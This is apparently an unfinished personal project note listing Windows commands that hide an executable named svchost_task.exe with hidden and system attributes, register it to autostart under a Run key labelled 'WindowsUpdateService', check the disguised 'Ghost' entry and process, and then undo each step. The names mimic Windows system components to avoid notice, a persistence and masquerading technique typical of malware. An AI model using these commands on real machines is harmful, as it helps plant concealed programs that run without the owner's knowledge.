New project 
comming soon
still on progress...
2026



## Hide 

attrib +h +s +r .\svchost_task.exe

## The Registry Command

New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateService" -Value "C:\Users\User\AppData\Roaming\Microsoft\Windows\Templates\svchost_task.exe" -PropertyType String

## Verification: How to see your "Ghost" entry

Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object WindowsUpdateService

## check backgroudn running

Get-Process svchost_task -ErrorAction SilentlyContinue

##
##

## REMOVE auto staart

Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateService"

## stop running forc

Stop the Running "Ghost" Process

## unhide

attrib -h -s -r .\svchost_task.exe



